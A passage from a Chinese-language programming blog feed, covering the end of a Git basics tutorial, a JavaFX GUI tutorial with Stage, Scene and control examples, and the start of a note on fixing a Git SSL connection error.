<span class="hljs-title">https</span>://github.com/pacemrc/testGit.git</code></pre></div><h3 id="从远程仓库拉取新的代码"><a href="#从远程仓库拉取新的代码" class="headerlink" title="从远程仓库拉取新的代码"></a>从远程仓库拉取新的代码</h3><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">git pull</span></code></pre></div><h2 id="分支的操作"><a href="#分支的操作" class="headerlink" title="分支的操作"></a>分支的操作</h2><h3 id="查看分支"><a href="#查看分支" class="headerlink" title="查看分支"></a>查看分支</h3><p>查看本地分支</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">git branch</span></code></pre></div><p>查看远程分支</p><div class="code-wrapper"><pre><code class="hljs css">git branch -<span class="hljs-attribute">r</span></code></pre></div><p>查看本地和远程分支</p><div class="code-wrapper"><pre><code class="hljs css">git branch -<span class="hljs-selector-tag">a</span></code></pre></div><h3 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h3><div class="code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">git</span> branch 分支名称<span class="hljs-symbol">git</span> checkout -<span class="hljs-keyword">b</span> 分支名称  <span class="hljs-comment">//创建并切换到新的分支</span></code></pre></div><h3 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h3><div class="code-wrapper"><pre><code class="hljs mipsasm">git <span class="hljs-keyword">branch </span>-d 分支名称</code></pre></div><h3 id="修改分支名称"><a href="#修改分支名称" class="headerlink" title="修改分支名称"></a>修改分支名称</h3><div class="code-wrapper"><pre><code class="hljs jsx">git branch -M oldName newNamegit branch --show-current  查看当前分支名称</code></pre></div><h3 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h3><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">git</span> checkout 分支名称</code></pre></div><h3 id="合并分支代码"><a href="#合并分支代码" class="headerlink" title="合并分支代码"></a>合并分支代码</h3><p>将指定分支的代码合并到当前分支上</p><div class="code-wrapper"><pre><code class="hljs cos">git <span class="hljs-keyword">merge</span> 分支名称</code></pre></div><h2 id="标签的操作"><a href="#标签的操作" class="headerlink" title="标签的操作"></a>标签的操作</h2><h3 id="查看标签"><a href="#查看标签" class="headerlink" title="查看标签"></a>查看标签</h3><div class="code-wrapper"><pre><code class="hljs crmsh">git <span class="hljs-keyword">tag</span></code></pre></div><p>查看当前所在标签</p><div class="code-wrapper"><pre><code class="hljs 1c">git <span class="hljs-built_in">log</span></code></pre></div><h3 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h3><div class="code-wrapper"><pre><code class="hljs crmsh">git <span class="hljs-keyword">tag</span> <span class="hljs-title">[tagName</span>]</code></pre></div><h3 id="删除标签"><a href="#删除标签" class="headerlink" title="删除标签"></a>删除标签</h3><div class="code-wrapper"><pre><code class="hljs crmsh">git <span class="hljs-keyword">tag</span> <span class="hljs-title">-d</span> [tagName]</code></pre></div><h1 id="集成IDEA"><a href="#集成IDEA" class="headerlink" title="集成IDEA"></a>集成IDEA</h1><h2 id="IDEA配置Git"><a href="#IDEA配置Git" class="headerlink" title="IDEA配置Git"></a>IDEA配置Git</h2><p>进入到All Settings–&gt;Version Control–&gt;Git，在Path to Git executable设置Git可执行文件的路径，点击test当出现Git的版本即成功配置</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904093642649.png"></p><h2 id="初始化本地仓库"><a href="#初始化本地仓库" class="headerlink" title="初始化本地仓库"></a>初始化本地仓库</h2><p>点击菜单栏中VCS–&gt;Create Git Repository，选择需要初始化的文件夹，将当前项目初始化为git项目</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904094021748.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904094145852.png"></p><h2 id="文件名颜色含义"><a href="#文件名颜色含义" class="headerlink" title="文件名颜色含义"></a>文件名颜色含义</h2><p>红色表示文件未添加到工作区</p><p>绿色表示文件处于工作区</p><p>黄色表示文件不会参与提交</p><p>白色（无颜色）表示文件已提交至版本控制</p><h2 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h2><p>排除项目中需要添加到git暂存区的文件，需手动创建。排除的文件通常是&#x2F;target&#x2F;目录，*.log等文件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904101655006.png"></p><h2 id="从远程仓库克隆"><a href="#从远程仓库克隆" class="headerlink" title="从远程仓库克隆"></a>从远程仓库克隆</h2><p>点击菜单栏中Git–&gt;Clone</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904101816720.png"></p><p>在Repository URL中，Version control选择Git，URL输入远程仓库的地址，Directory输入在本地创建的地址</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904101927463.png"></p><h2 id="将本地仓库推送到远程仓库"><a href="#将本地仓库推送到远程仓库" class="headerlink" title="将本地仓库推送到远程仓库"></a>将本地仓库推送到远程仓库</h2><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904102317589.png"></p><h2 id="如何取消Git项目"><a href="#如何取消Git项目" class="headerlink" title="如何取消Git项目"></a>如何取消Git项目</h2><p>进入Settings–&gt;Version Control–&gt;Directory Mappings设置，将项目的映射关系删除，<strong>同时将项目文件夹下的.git文件夹删除掉</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904102850447.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230904103129279.png"></p>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaFx教程</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaFx/JavaFx/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaFx/JavaFx/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="JavaFx"><a href="#JavaFx" class="headerlink" title="JavaFx"></a>JavaFx</h2><p>javafx可以开发图形化工具，在jdk8以前javafx内置在jdk中，在jdk8以后javafx独立成开源项目。</p><p>SDK下载：<a href="https://gluonhq.com/products/javafx/">https://gluonhq.com/products/javafx/</a></p><p>教程：<a href="https://jenkov.com/tutorials/javafx/index.html">https://jenkov.com/tutorials/javafx/index.html</a><a href="https://openjfx.cn/index.html">https://openjfx.cn/index.html</a></p><h2 id="SceneBuilder"><a href="#SceneBuilder" class="headerlink" title="SceneBuilder"></a>SceneBuilder</h2><p>scene builder可以帮助java开发者以图形化的界面设计界面。</p><p>软件下载：<a href="https://gluonhq.com/products/scene-builder/">https://gluonhq.com/products/scene-builder/</a></p><h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p>javafx程序运行需要窗口，窗口之上需要设置舞台，舞台上面需要设置布局，布局里面可以添加控件</p><p><img src="https://jenkov.com/images/java-javafx/javafx-overview-1.png"> </p><h1 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h1><h2 id="Stage"><a href="#Stage" class="headerlink" title="Stage"></a>Stage</h2><p>Stage是java程序的窗口。</p><h3 id="创建窗口"><a href="#创建窗口" class="headerlink" title="创建窗口"></a>创建窗口</h3><p>Application类的start方法会自动创建一个stage</p><div class="code-wrapper"><pre><code class="hljs abnf">Stage myStage <span class="hljs-operator">=</span> new Stage()<span class="hljs-comment">;</span></code></pre></div><h3 id="显示窗口"><a href="#显示窗口" class="headerlink" title="显示窗口"></a>显示窗口</h3><div class="code-wrapper"><pre><code class="hljs abnf">myStage.show()<span class="hljs-comment">;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128222019600.png"> </p><h3 id="窗口设置舞台"><a href="#窗口设置舞台" class="headerlink" title="窗口设置舞台"></a>窗口设置舞台</h3><div class="code-wrapper"><pre><code class="hljs abnf">VBox vBox <span class="hljs-operator">=</span> new VBox(new Label(<span class="hljs-string">&quot;javafx&quot;</span>))<span class="hljs-comment">;</span>Scene myScene <span class="hljs-operator">=</span> new Scene(vBox)<span class="hljs-comment">;</span>Stage myStage <span class="hljs-operator">=</span> new Stage()<span class="hljs-comment">;</span>myStage.setScene(myScene)<span class="hljs-comment">;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128221908170.png"> </p><h3 id="窗口设置标题"><a href="#窗口设置标题" class="headerlink" title="窗口设置标题"></a>窗口设置标题</h3><div class="code-wrapper"><pre><code class="hljs abnf">stage.setTitle(<span class="hljs-string">&quot;this is title&quot;</span>)<span class="hljs-comment">;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128221936428.png"> </p><h3 id="设置窗口位置"><a href="#设置窗口位置" class="headerlink" title="设置窗口位置"></a>设置窗口位置</h3><div class="code-wrapper"><pre><code class="hljs abnf">myStage.setX(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>myStage.setY(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128222245234.png"></p><h3 id="设置窗口宽高"><a href="#设置窗口宽高" class="headerlink" title="设置窗口宽高"></a>设置窗口宽高</h3><div class="code-wrapper"><pre><code class="hljs abnf">myStage.setWidth(<span class="hljs-number">500</span>)<span class="hljs-comment">;</span>myStage.setHeight(<span class="hljs-number">300</span>)<span class="hljs-comment">;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128222425497.png"> </p><h3 id="设置窗口模态"><a href="#设置窗口模态" class="headerlink" title="设置窗口模态"></a>设置窗口模态</h3><p>窗口模态是指当父窗口打开子窗口后，操作父窗口是否会阻塞</p><p>Modality.APPLICATION_MODAL当窗口设置为APPLICATION_MODAL模态，无法操作其他窗口<br>Modality.WINDOW_MODAL当窗口设置为WINDOW_MODAL模态，可以操作其他窗口<br>Modality.NONE</p><div class="code-wrapper"><pre><code class="hljs scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoApplication</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Application</span> </span>&#123;    <span class="hljs-meta">@Override</span>    public void start(<span class="hljs-type">Stage</span> primaryStage) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> &#123;        primaryStage.setTitle(<span class="hljs-string">&quot;JavaFX App&quot;</span>);        <span class="hljs-type">Stage</span> stage = <span class="hljs-keyword">new</span> <span class="hljs-type">Stage</span>();        stage.initModality(<span class="hljs-type">Modality</span>.<span class="hljs-type">APPLICATION_MODAL</span>);        <span class="hljs-comment">//stage.initModality(Modality.WINDOW_MODAL);</span>        <span class="hljs-comment">//stage.initModality(Modality.NONE);</span>        primaryStage.show();        stage.showAndWait();    &#125;        public static void main(<span class="hljs-type">String</span>[] args) &#123;        launch();    &#125;&#125;</code></pre></div><h3 id="设置窗口拥有者"><a href="#设置窗口拥有者" class="headerlink" title="设置窗口拥有者"></a>设置窗口拥有者</h3><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-title class_">String</span>[] args</span>) &#123;    <span class="hljs-title function_">launch</span>(args);&#125;<span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"><span class="hljs-title class_">Stage</span> primaryStage</span>) &#123;    primaryStage.<span class="hljs-title function_">setTitle</span>(<span class="hljs-string">&quot;JavaFX App&quot;</span>);    <span class="hljs-title class_">Stage</span> stage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stage</span>();    stage.<span class="hljs-title function_">initModality</span>(<span class="hljs-title class_">Modality</span>.<span class="hljs-property">WINDOW_MODAL</span>);    stage.<span class="hljs-title function_">initOwner</span>(primaryStage);    primaryStage.<span class="hljs-title function_">show</span>();    stage.<span class="hljs-title function_">showAndWait</span>();&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128230810627.png"></p><h3 id="设置窗口样式"><a href="#设置窗口样式" class="headerlink" title="设置窗口样式"></a>设置窗口样式</h3><div class="code-wrapper"><pre><code class="hljs abnf">stage.initStyle(StageStyle.DECORATED)<span class="hljs-comment">;</span>//stage.initStyle(StageStyle.UNDECORATED)<span class="hljs-comment">;</span>//stage.initStyle(StageStyle.TRANSPARENT)<span class="hljs-comment">;</span>//stage.initStyle(StageStyle.UNIFIED)<span class="hljs-comment">;</span>//stage.initStyle(StageStyle.UTILITY)<span class="hljs-comment">;</span>stage.show()<span class="hljs-comment">;</span></code></pre></div><h4 id="StageStyle-UNDECORATED"><a href="#StageStyle-UNDECORATED" class="headerlink" title="StageStyle.UNDECORATED"></a>StageStyle.UNDECORATED</h4><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128230915737.png"></p><h4 id="StageStyle-UNDECORATED-1"><a href="#StageStyle-UNDECORATED-1" class="headerlink" title="StageStyle.UNDECORATED"></a>StageStyle.UNDECORATED</h4><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128231113262.png"></p><h4 id="StageStyle-TRANSPARENT"><a href="#StageStyle-TRANSPARENT" class="headerlink" title="StageStyle.TRANSPARENT"></a>StageStyle.TRANSPARENT</h4><p>透明看不见</p><h4 id="StageStyle-UNIFIED"><a href="#StageStyle-UNIFIED" class="headerlink" title="StageStyle.UNIFIED"></a>StageStyle.UNIFIED</h4><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128234141654.png">  </p><h4 id="StageStyle-UTILITY"><a href="#StageStyle-UTILITY" class="headerlink" title="StageStyle.UTILITY"></a>StageStyle.UTILITY</h4><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128234240593.png"></p><h3 id="设置窗口全屏模式"><a href="#设置窗口全屏模式" class="headerlink" title="设置窗口全屏模式"></a>设置窗口全屏模式</h3><div class="code-wrapper"><pre><code class="hljs abnf">VBox vbox <span class="hljs-operator">=</span> new VBox()<span class="hljs-comment">;</span>Scene scene <span class="hljs-operator">=</span> new Scene(vbox)<span class="hljs-comment">;</span>stage.setScene(scene)<span class="hljs-comment">;</span>stage.setFullScreen(true)<span class="hljs-comment">;</span>stage.show()<span class="hljs-comment">;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128234427133.png"></p><h3 id="窗口生命周期事件"><a href="#窗口生命周期事件" class="headerlink" title="窗口生命周期事件"></a>窗口生命周期事件</h3><h4 id="Close-Stage-Event-Listener"><a href="#Close-Stage-Event-Listener" class="headerlink" title="Close Stage Event Listener"></a>Close Stage Event Listener</h4><p>监听点击窗口的X动作，执行自定义功能</p><div class="code-wrapper"><pre><code class="hljs livescript">stage.show();stage.setOnCloseRequest<span class="hljs-function"><span class="hljs-params">((event) -&gt; &#123;</span></span><span class="hljs-params"><span class="hljs-function">    System.out.println(<span class="hljs-string">&quot;Closing Stage&quot;</span>);</span></span><span class="hljs-params"><span class="hljs-function">&#125;)</span>;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128234835653.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231128234851843.png"></p><h4 id="Hiding-Stage-Event-Listener"><a href="#Hiding-Stage-Event-Listener" class="headerlink" title="Hiding Stage Event Listener"></a>Hiding Stage Event Listener</h4><p>该监听在窗口被隐藏前调用</p><div class="code-wrapper"><pre><code class="hljs livescript">primaryStage.setOnHiding<span class="hljs-function"><span class="hljs-params">((event) -&gt; &#123;</span></span><span class="hljs-params"><span class="hljs-function">    System.out.println(<span class="hljs-string">&quot;Hiding Stage&quot;</span>);</span></span><span class="hljs-params"><span class="hljs-function">&#125;)</span>;</span></code></pre></div><h4 id="Hidden-Stage-Event-Listener"><a href="#Hidden-Stage-Event-Listener" class="headerlink" title="Hidden Stage Event Listener"></a>Hidden Stage Event Listener</h4><p>该监听在窗口被隐藏后调用</p><div class="code-wrapper"><pre><code class="hljs livescript">primaryStage.setOnHidden<span class="hljs-function"><span class="hljs-params">((event) -&gt; &#123;</span></span><span class="hljs-params"><span class="hljs-function">    System.out.println(<span class="hljs-string">&quot;Stage hidden&quot;</span>);</span></span><span class="hljs-params"><span class="hljs-function">&#125;)</span>;</span></code></pre></div><h4 id="Showing-Stage-Event-Listener"><a href="#Showing-Stage-Event-Listener" class="headerlink" title="Showing Stage Event Listener"></a>Showing Stage Event Listener</h4><p>该监听在执行show方法之前调用</p><div class="code-wrapper"><pre><code class="hljs livescript">primaryStage.setOnShowing<span class="hljs-function"><span class="hljs-params">((event) -&gt; &#123;</span></span><span class="hljs-params"><span class="hljs-function">    System.out.println(<span class="hljs-string">&quot;Showing Stage&quot;</span>);</span></span><span class="hljs-params"><span class="hljs-function">&#125;)</span>;</span></code></pre></div><h4 id="Stage-Keyboard-Events"><a href="#Stage-Keyboard-Events" class="headerlink" title="Stage Keyboard Events"></a>Stage Keyboard Events</h4><p>该监听键盘操作，下面示例，当按下ESC键时关闭窗口，按下回车键时窗口放大一倍</p><div class="code-wrapper"><pre><code class="hljs livescript">stage.addEventHandler<span class="hljs-function"><span class="hljs-params">(KeyEvent.KEY_PRESSED,  (event) -&gt; &#123;</span></span><span class="hljs-params"><span class="hljs-function">    System.out.println(<span class="hljs-string">&quot;Key pressed: &quot;</span> + event.toString());</span></span><span class="hljs-params"><span class="hljs-function"></span></span><span class="hljs-params"><span class="hljs-function">    <span class="hljs-keyword">switch</span>(event.getCode().getCode()) &#123;</span></span><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">case</span> <span class="hljs-number">27</span> : &#123; <span class="hljs-regexp">// 27 = ESC key</span></span></span><span class="hljs-regexp"><span class="hljs-params"><span class="hljs-function">            stage.close();</span></span></span><span class="hljs-regexp"><span class="hljs-params"><span class="hljs-function">            break;</span></span></span><span class="hljs-regexp"><span class="hljs-params"><span class="hljs-function">        &#125;</span></span></span><span class="hljs-regexp"><span class="hljs-params"><span class="hljs-function">        case 10 : &#123; //</span> <span class="hljs-number">10</span> = Return</span></span><span class="hljs-params"><span class="hljs-function">            stage.setWidth( stage.getWidth() * <span class="hljs-number">2</span>);</span></span><span class="hljs-params"><span class="hljs-function">        &#125;</span></span><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">default</span>:  &#123;</span></span><span class="hljs-params"><span class="hljs-function">            System.out.println(<span class="hljs-string">&quot;Unrecognized key&quot;</span>);</span></span><span class="hljs-params"><span class="hljs-function">        &#125;</span></span><span class="hljs-params"><span class="hljs-function">    &#125;</span></span><span class="hljs-params"><span class="hljs-function">&#125;)</span>;</span></code></pre></div><h2 id="Scene"><a href="#Scene" class="headerlink" title="Scene"></a>Scene</h2><p>scene表示窗口的场景，javafx中一切GUI组件都必须要放在scene上面。一个场景一次只能添加到一个窗口上，且一个窗口一次只能显示一个场景</p><h3 id="创建场景"><a href="#创建场景" class="headerlink" title="创建场景"></a>创建场景</h3><div class="code-wrapper"><pre><code class="hljs abnf">VBox  vBox  <span class="hljs-operator">=</span> new VBox()<span class="hljs-comment">;</span>Scene scene <span class="hljs-operator">=</span> new Scene(vBox)<span class="hljs-comment">;</span></code></pre></div><h3 id="将场景设置到窗口"><a href="#将场景设置到窗口" class="headerlink" title="将场景设置到窗口"></a>将场景设置到窗口</h3><div class="code-wrapper"><pre><code class="hljs abnf">VBox vBox <span class="hljs-operator">=</span> new VBox()<span class="hljs-comment">;</span>Scene scene <span class="hljs-operator">=</span> new Scene(vBox)<span class="hljs-comment">;</span>Stage myStage <span class="hljs-operator">=</span> new Stage()<span class="hljs-comment">;</span>myStage.setScene(scene)<span class="hljs-comment">;</span>myStage.show()<span class="hljs-comment">;</span></code></pre></div><h3 id="场景图"><a href="#场景图" class="headerlink" title="场景图"></a>场景图</h3><p>所有视觉组件（控件、布局等）都必须附加到要显示的场景，并且该场景必须附加到舞台才能使整个场景可见。附加到场景的所有控件、布局等的总对象图称为场景图。</p><h3 id="场景鼠标光标"><a href="#场景鼠标光标" class="headerlink" title="场景鼠标光标"></a>场景鼠标光标</h3><p>Cursor.OPEN_HAND<br>Cursor.CLOSED_HAND<br>Cursor.CROSSHAIR<br>Cursor.DEFAULT<br>Cursor.HAND<br>Cursor.WAIT<br>Cursor.H_RESIZE<br>Cursor.V_RESIZE<br>Cursor.MOVE<br>Cursor.TEXT</p><h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><p>添加到场景图的所有组件都称为节点。每个JavaFX节点（子类）实例只能添加到JavaFX场景图中一次。换句话说，每个节点实例只能出现在场景图中的一个位置。</p><h3 id="Parent"><a href="#Parent" class="headerlink" title="Parent"></a>Parent</h3><p>继承了Parent类的子类可以拥有子节点。有以下类Group、Region和WebView。</p><h4 id="Group"><a href="#Group" class="headerlink" title="Group"></a>Group</h4><p>JavaFX Group 组件是一个容器组件，对其子组件不采用特殊布局。所有子组件（节点）的位置都是 0,0。JavaFX Group 组件通常用于对一组控件（作为一个组）整体应用某种效果或变换。如果需要对组内部的子控件进行布局，可将它们嵌套在布局组件中，然后将布局组件添加到组中。</p><h4 id="Region"><a href="#Region" class="headerlink" title="Region"></a>Region</h4><p>javafx.scene.layout.Region类是所有布局类的基类</p><h4 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h4><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><p>JavaFX 属性是 JavaFX 控件的一种特殊成员变量。JavaFX 属性通常用于包含控件属性，如 X 和 Y 位置、宽度和高度、文本、子控件以及 JavaFX 控件的其他核心属性。您可以为 JavaFX 属性附加更改监听器，这样当属性值发生变化时，其他组件就会收到通知，您还可以将属性相互绑定，这样当一个属性值发生变化时，另一个也会发生变化。</p><h2 id="FXML"><a href="#FXML" class="headerlink" title="FXML"></a>FXML</h2><p>建议使用SceneBuilder来构建fxml</p><h1 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h1><p><img src="https://jenkov.com/images/java-javafx/javafx-region-0.png"></p><h2 id="Axis"><a href="#Axis" class="headerlink" title="Axis"></a>Axis</h2><h2 id="Chart"><a href="#Chart" class="headerlink" title="Chart"></a>Chart</h2><h2 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h2><h3 id="下拉框-ComboBox"><a href="#下拉框-ComboBox" class="headerlink" title="下拉框-ComboBox"></a>下拉框-ComboBox</h3><h4 id="创建下拉框"><a href="#创建下拉框" class="headerlink" title="创建下拉框"></a>创建下拉框</h4><div class="code-wrapper"><pre><code class="hljs abnf">ComboBox comboBox <span class="hljs-operator">=</span> new ComboBox()<span class="hljs-comment">;</span></code></pre></div><h4 id="下拉框添加选项"><a href="#下拉框添加选项" class="headerlink" title="下拉框添加选项"></a>下拉框添加选项</h4><div class="code-wrapper"><pre><code class="hljs routeros">ComboBox&lt;String&gt; stringComboBox = new ComboBox&lt;&gt;();stringComboBox.getItems().<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;aaa&quot;</span>);stringComboBox.getItems().<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;bbb&quot;</span>);stringComboBox.getItems().<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;ccc&quot;</span>);</code></pre></div><h4 id="下拉框到场景中"><a href="#下拉框到场景中" class="headerlink" title="下拉框到场景中"></a>下拉框到场景中</h4><div class="code-wrapper"><pre><code class="hljs pgsql">@Override<span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">start</span>(Stage stage) &#123;    ComboBox&lt;String&gt; stringComboBox = <span class="hljs-built_in">new</span> ComboBox&lt;&gt;();    stringComboBox.getItems().<span class="hljs-keyword">add</span>(&quot;aaa&quot;);    stringComboBox.getItems().<span class="hljs-keyword">add</span>(&quot;bbb&quot;);    stringComboBox.getItems().<span class="hljs-keyword">add</span>(&quot;ccc&quot;);    VBox vBox = <span class="hljs-built_in">new</span> VBox();    vBox.getChildren().<span class="hljs-keyword">add</span>(stringComboBox);    Scene scene = <span class="hljs-built_in">new</span> Scene(vBox);    stage.setTitle(&quot;JavaFX App&quot;);    stage.setScene(scene);    stage.setWidth(<span class="hljs-number">500</span>);    stage.setHeight(<span class="hljs-number">300</span>);    stage.<span class="hljs-keyword">show</span>();&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231129104714204.png"> </p><h4 id="设置下拉框可编辑"><a href="#设置下拉框可编辑" class="headerlink" title="设置下拉框可编辑"></a>设置下拉框可编辑</h4><div class="code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span>ComboBox.setEditable(<span class="hljs-literal">true</span>);</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231129104843377.png"> </p><h4 id="获取下拉框选择的值"><a href="#获取下拉框选择的值" class="headerlink" title="获取下拉框选择的值"></a>获取下拉框选择的值</h4><div class="code-wrapper"><pre><code class="hljs abnf">String value <span class="hljs-operator">=</span> (String) comboBox.getValue()<span class="hljs-comment">;</span></code></pre></div><h4 id="下拉框监听事件"><a href="#下拉框监听事件" class="headerlink" title="下拉框监听事件"></a>下拉框监听事件</h4><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">stringComboBox</span><span class="hljs-selector-class">.setOnAction</span>((actionEvent -&gt; &#123;    int selectedIndex = stringComboBox.<span class="hljs-built_in">getSelectionModel</span>().<span class="hljs-built_in">getSelectedIndex</span>();    String selectedItem = stringComboBox.<span class="hljs-built_in">getSelectionModel</span>().<span class="hljs-built_in">getSelectedItem</span>();    System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Selection made: [] &quot;</span> + selectedItem);    System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;   ComboBox.getValue(): &quot;</span> + stringComboBox.<span class="hljs-built_in">getValue</span>());&#125;));</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231129105334248.png"> </p><h3 id="按钮-Button"><a href="#按钮-Button" class="headerlink" title="按钮-Button"></a>按钮-Button</h3><h4 id="按钮监听事件"><a href="#按钮监听事件" class="headerlink" title="按钮监听事件"></a>按钮监听事件</h4><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage stage)</span> &#123;    <span class="hljs-type">Label</span> <span class="hljs-variable">label1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;Not Click!&quot;</span>);    <span class="hljs-type">Button</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Click&quot;</span>);    button.setOnAction(actionEvent -&gt; &#123;        label1.setText(<span class="hljs-string">&quot;Clicked!&quot;</span>);    &#125;);    <span class="hljs-type">VBox</span> <span class="hljs-variable">vBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VBox</span>();    vBox.getChildren().addAll(label1,button);    <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(vBox);    stage.setTitle(<span class="hljs-string">&quot;JavaFX App&quot;</span>);    stage.setScene(scene);    stage.setWidth(<span class="hljs-number">300</span>);    stage.setHeight(<span class="hljs-number">100</span>);    stage.show();&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231129110017969.png"> </p><p>点击按钮后</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231129110031330.png"> </p><h2 id="Pane"><a href="#Pane" class="headerlink" title="Pane"></a>Pane</h2>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaFx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaFX</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git问题记录</title>
    <link href="/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Git/"/>
    <url>/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Git/</url>
    
    <content type="html"><![CDATA[<p><strong>问题描述</strong></p><p>fatal: unable to access ‘<a href="https://github.com/pacemrc/TwitterCrawler.git/">https://github.com/pacemrc/TwitterCrawler.git/</a>‘: OpenSSL SSL_read: Connection was reset, errno 10054</p><p><strong>解决</strong></p><div class="code-wrapper"><pre><code class="hljs nix">git config <span class="hljs-operator">-</span>-global http.sslBackend <span class="hljs-string">&quot;openssl&quot;</span>git config <span class="hljs-operator">-</span>-global http.sslCAInfo <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\P</span>rogram Files<span class="hljs-char escape_">\G</span>it<span class="hljs-char escape_">\m</span>ingw64<span class="hljs-char escape_">\s</span>sl<span class="hljs-char escape_">\c</span>ert.pem&quot;</span></code></pre></div><p><strong>问题描述</strong></p><p>fatal: unable to access ‘<a 